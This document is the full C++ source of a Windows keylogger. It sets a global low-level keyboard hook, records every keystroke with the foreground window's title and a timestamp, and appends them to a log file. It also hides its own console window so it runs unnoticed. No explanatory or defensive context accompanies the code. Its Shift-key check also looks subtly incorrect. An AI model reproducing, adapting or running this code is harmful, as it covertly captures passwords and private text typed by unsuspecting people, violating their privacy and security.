#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>

#define FORMAT 0 
HHOOK _hook;
KBDLLHOOKSTRUCT kStruct;

int Save(int lol_s);
std::ofstream output_file;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            Save(kStruct.vkCode);
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int lol_s)
{
    std::stringstream output;
    static char lasttit[256] = "";

    if ((lol_s == 1) || (lol_s == 2))
    {
        return 0;
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char tit[256];
        GetWindowTextA(foreground, (LPSTR)tit, 256);

        if (strcmp(tit, lasttit) != 0)
        {
            strcpy_s(lasttit, sizeof(lasttit), tit);

            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%c", &tm);

            output << "\n\n[" << tit << " - at " << s << "] ";
        }
    }
    int form = FORMAT;
    switch (form)
    {
    case 10:
        output << '[' << lol_s << ']';
        break;
    case 16:
        output << std::hex << "[0x" << lol_s << ']';
        break;
    default:
        if (lol_s == 0x08)
        {
            output << "[BSP]";
        }
        else if (lol_s == 0x0D)
        {
            output << "\n";
        }
        else if (lol_s == 0x20)
        {
            output << " ";
        }
        else if (lol_s == 0x09)
        {

        }
        else if ((lol_s == 0x10) || (lol_s == 0xA0) || (lol_s == 0xA1))
        {
        }
        else if ((lol_s == 0x11) || (lol_s == 0xA2) || (lol_s == 0xA3))
        {
        }
        else if (lol_s == 0x12)
        {
        }
        else if ((lol_s == 0x5B) || (lol_s == 0x5C))
        {
        }
        else if (lol_s == 0x1B)
        {
        }
        else if (lol_s == 0x23)
        {
        }
        else if (lol_s == 0x24)
        {
        }
        else if (lol_s == 0x25)
        {
        }
        else if (lol_s == 0x26)
        {
        }
        else if (lol_s == 0x27)
        {
        }
        else if (lol_s == 0x28)
        {
        }
        else if (lol_s == 0x21)
        {
        }
        else if (lol_s == 0x22)
        {
        }
        else if (lol_s == 0xBE || lol_s == 0x6E)
        {
        }
        else if (lol_s == 0xBD || lol_s == 0x6D)
        {
        }
        else if (lol_s == 0x14)
        {
        }
        else
        {
            char k;
            bool lowercase = ((GetKeyState(0x14) & 0x0001) != 0);

            if ((GetKeyState(0x10) & 0x1000) != 0 || (GetKeyState(0xA0) & 0x1000) != 0
                || (GetKeyState(0xA1) & 0x1000) != 0)
            {
                lowercase = !lowercase;
            }

            k = MapVirtualKeyExA(lol_s, MAPVK_VK_TO_CHAR, layout);

            if (!lowercase)
            {
                k = tolower(k);
            }
            output << char(k);
        }
        break;
    }

    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

int main(int argc, char** argv)
{
    std::string output_filename;
    output_filename = (argc == 2) ? argv[1] : "lol.log";

    output_file.open(output_filename, std::ios_base::app);
    if (output_file.is_open())
        std::cout << "Logging output to " << output_filename << std::endl;
    else
        std::cout << "Failed to create/open the file '" << output_filename << "'\n", exit(1);

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}